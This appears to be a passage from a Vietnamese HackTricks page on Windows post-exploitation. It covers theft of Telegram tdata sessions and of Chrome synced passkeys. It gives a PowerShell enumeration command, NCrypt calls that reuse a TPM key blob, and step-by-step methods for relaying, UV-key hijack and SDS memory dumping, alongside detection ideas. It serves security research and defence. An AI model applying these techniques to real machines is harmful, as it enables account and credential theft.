Một implant chú trọng tiết kiệm băng thông có thể chỉ gửi danh sách đường dẫn tệp trước, nhận mã định danh snapshot cùng các đường dẫn C2 đã lưu, rồi chỉ tải lên những tệp còn thiếu. Vì vậy, các lượt truyền nhỏ tăng dần sau khi liệt kê đệ quy `tdata` vẫn có thể cho thấy việc đánh cắp phiên đã thành công.<sup>[[10]](#references)</sup>

### Phát hiện và ngăn chặn

Đối chiếu việc một tiến trình không phải Telegram truy cập đệ quy vào `tdata` với việc bật `SeBackupPrivilege`, mở tệp theo ngữ nghĩa sao lưu, hoạt động VSS hoặc tiến trình con `robocopy.exe` sử dụng `/B`. Đồng thời, tìm kiếm việc liệt kê nhanh cả `%APPDATA%` và `%LOCALAPPDATA%\Packages`, sau đó là các kết nối ra ngoài từ cùng tiến trình. Sau khi bị xâm nhập, hãy dùng **Settings → Devices** (hoặc **Privacy & Security → Active Sessions**) để chấm dứt các phiên không nhận ra; chỉ bật xác minh hai bước sẽ không thu hồi quyền truy cập đã bị đánh cắp trước đó.<sup>[[10]](#references)[[13]](#references)</sup>

## Đánh cắp thông tin xác thực Passkeys / WebAuthn từ Chrome trên Windows

Nếu có được khả năng thực thi mã với tư cách **người dùng nạn nhân** trên máy Windows sử dụng **Chrome + passkeys được đồng bộ qua Google Password Manager**, passkeys trở thành mục tiêu post-exploitation đáng chú ý ngay cả khi **không có quyền admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Các hiện vật cục bộ đáng chú ý

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** lưu trữ các bản ghi **`WebauthnCredentialSpecifics`** được mã hóa bằng protobuf. Một tiến trình chạy dưới cùng tài khoản người dùng có thể liệt kê **RP ID**, **tên người dùng**, **credential ID** và dữ liệu khóa riêng được mã hóa của các passkey đã đồng bộ.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** lưu trữ trạng thái đăng ký thiết bị cục bộ, chẳng hạn như **`wrapped_identity_private_key`** và secret được bọc dùng để khôi phục thông tin xác thực đã đồng bộ.<sup>[[4]](#references)</sup>

Phân loại nhanh:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blob khóa gắn với TPM vẫn có thể bị lạm dụng làm oracle ký cục bộ

Nếu trình duyệt xuất khóa danh tính được TPM bảo vệ dưới dạng **`NCRYPT_OPAQUE_KEY_BLOB`** và lưu blob đó ở trạng thái mà người dùng có thể truy cập, malware **không** cần trích xuất khóa riêng tư thô. Nó chỉ cần nhập lại blob trên **cùng một máy** và yêu cầu TPM cục bộ ký dữ liệu do kẻ tấn công kiểm soát:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Điều này có nghĩa là **hardware binding ngăn việc xuất khóa ra khỏi thiết bị, nhưng không ngăn cùng người dùng sử dụng khóa trên endpoint bị xâm phạm**.

### Các phương thức lạm dụng thực tế

1. **Pass-ta-key / chuyển tiếp device-identity**<sup>[[4]](#references)</sup>
   - Liệt kê `WebauthnCredentialSpecifics` từ LevelDB của Chrome.
   - Bắt đầu đăng nhập bằng passkey và lấy WebAuthn challenge mới.
   - Dùng blob `wrapped_identity_private_key` bị đánh cắp trên TPM của nạn nhân để ký phần binding trong yêu cầu cloud-authenticator.
   - Chuyển tiếp assertion nhận được đến relying party.
   - Cách này đặc biệt hữu ích khi RP chấp nhận `userVerification=preferred` hoặc không từ chối assertion có **`UV=0`**.
2. **Chiếm quyền UV-key đang chờ**<sup>[[4]](#references)</sup>
   - Buộc thực hiện lại quá trình onboarding bằng cách xóa `passkey_enclave_state` hoặc gửi một thao tác `device/forget` được ký hợp lệ.
   - Nếu onboarding để thiết bị ở trạng thái **`uv_key_pending`**, đăng ký một UV public key do kẻ tấn công kiểm soát.
   - Nếu nhà cung cấp không xác minh attestation / nguồn gốc secure-hardware cho UV key mới, các chữ ký về sau từ key của kẻ tấn công sẽ được xem là **`UV=1`**.
3. **Đánh cắp master-secret / khôi phục SDS**<sup>[[4]](#references)</sup>
   - Buộc khôi phục hoặc tham gia lại để Chrome tải master secret của synced-passkey.
   - Theo dõi việc tạo lại/chỉnh sửa `passkey_enclave_state`, sau đó dump bộ nhớ Chrome khi **security domain secret (SDS)** ở dạng plaintext đang hiện diện.
   - Dùng SDS khôi phục để giải mã các trường được mã hóa trong mọi bản ghi `WebauthnCredentialSpecifics` và khôi phục các WebAuthn private key có thể mang sang thiết bị khác.

### Ý tưởng DFIR / phát hiện

- Giám sát việc **xóa/tạo lại** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Cảnh báo khi các tiến trình không phải trình duyệt truy cập bất thường vào **`Sync Data\LevelDB`** của Chrome.
- Cảnh báo về **memory dump của Chrome** hoặc truy cập bộ nhớ liên tiến trình đáng ngờ.
- Điều tra các lời nhắc **Google Password Manager recovery PIN** lặp lại hoặc việc onboarding lại bất ngờ.
- Lưu ý rằng **`signCount`** của WebAuthn thường không hữu ích với synced passkey vì giá trị này có thể không đổi, nên khả năng phát hiện clone theo cách truyền thống khá yếu.



## References

- [1] [Unit 42 – Điều tra các chiến dịch kéo dài nhiều năm, không bị phát hiện, nhắm vào các lĩnh vực có giá trị cao](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Lừa đảo bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → Veeam CVE-2023-27532 để lên SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng lưới chuyển tiếp và cách vận hành nội bộ của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Một bề mặt tấn công mới trong xác thực không mật khẩu](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / lưu trữ khóa CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Tấn công vào hệ thống và mạng Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Cách kho dữ liệu Active Directory thực sự hoạt động: Bên trong NTDS.dit (Phần 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump mật khẩu Lsass từ xa](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho mở rộng kho công cụ gián điệp mạng với bộ công cụ Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Hàm CreateFileW và `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Chế độ sao lưu Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Câu hỏi thường gặp của Telegram – chấm dứt các phiên đang hoạt động](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard và Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Bảo vệ và quản lý thông tin xác thực](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - các đầu vào được hỗ trợ và hướng dẫn bắt đầu nhanh](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
